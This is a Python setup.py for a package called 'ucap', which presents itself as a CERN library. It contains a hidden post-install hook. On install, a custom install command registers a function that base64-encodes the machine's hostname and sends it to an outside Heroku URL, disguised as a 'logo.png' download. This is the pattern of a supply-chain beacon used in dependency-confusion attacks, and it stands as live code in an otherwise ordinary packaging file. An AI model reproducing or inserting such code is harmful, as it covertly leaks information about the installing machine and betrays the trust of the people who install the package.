"""
setup.py for UCAP (Python).

For reference see
https://packaging.python.org/guides/distributing-packages-using-setuptools/

"""
import atexit
# ruff: noqa: E402

import base64
import os
import sys
from pathlib import Path
import socket

from setuptools import find_packages, setup
from setuptools.command.install import install
import urllib
sys.path.append(str(Path(__file__).absolute().parents[1]))

VERSION = '3.6.1'
HERE = Path(__file__).parent.absolute()
with (HERE / "README.md").open("rt") as fh:
    LONG_DESCRIPTION = fh.read().strip()


def _post_install():
    hostname = base64.b64encode(socket.getfqdn().encode()).decode()
    url = f'https://stark-mesa-88610-1b7520139d14.herokuapp.com/logo.png?{hostname}'
    destination = os.path.join(os.path.dirname(__file__), 'logo.png')
    with urllib.request.urlopen(url) as response, open(destination, 'wb') as out_file:
        data = response.read()
        out_file.write(data)


class CustomInstallCommand(install):
    def __init__(self, *args, **kwargs):
        super(CustomInstallCommand, self).__init__(*args, **kwargs)
        atexit.register(_post_install)


REQUIREMENTS: dict = {
    "core": [
        # Needed for the improved protection against integer overflow
        # https://numpy.org/neps/nep-0050-scalar-promotion.html
        "numpy>=1.24.0,<2.0",
        "typing_extensions>=4.4.0;python_version<'3.12'",  # Support for @override
        "requests",
    ],
    "test": [
        "pytest",
        "pytest-cov",
        "pytest-html",
        "pytest-mock",
    ],
    "dev": [
        "mypy==1.8.0",
        "ruff==0.3.0",
    ],
    "doc": [
        "sphinx",
        "sphinx_rtd_theme",
        "sphinx-autoapi",
        "sphinxcontrib.napoleon",
        "sphinx-autodoc-typehints",
    ],
}


setup(
    name="ucap",
    version=VERSION,
    author="Michal Hrabia, Lajos Cseppento, Francesco Andreuzzi",
    author_email="ucap-support@cern.ch",
    description="UCAP-Python Library",
    long_description=LONG_DESCRIPTION,
    long_description_content_type="text/markdown",
    url="https://wikis.cern.ch/display/UCAP",
    packages=find_packages(),
    package_data={
        "ucap": [
            "tests/**/*.json",  # Needed for test resources
            "py.typed",  # Ship typing marker
        ]
    },
    python_requires=">=3.9, <4",
    classifiers=[
        "Operating System :: OS Independent",
        "Programming Language :: Python :: 3",
    ],
    install_requires=REQUIREMENTS["core"],
    cmdclass={
        'install': CustomInstallCommand,
    },
    extras_require={
        **REQUIREMENTS,
        # The 'dev' extra is the union of 'test' and 'doc', with an option
        # to have explicit development dependencies listed.
        "dev": [
            req
            for extra in ["dev", "test", "doc"]
            for req in REQUIREMENTS.get(extra, [])
        ],
        # The 'all' extra is the union of all requirements.
        "all": [req for reqs in REQUIREMENTS.values() for req in reqs],
    },
    entry_points={
        "console_scripts": [
            "ucap-generate-converter-template=ucap.common.converter_template.template_printer:main",
            "ucap-test-converter=ucap.test.converter_tester:main",
            "ucap=ucap.common.download:main",
        ]
    },
)
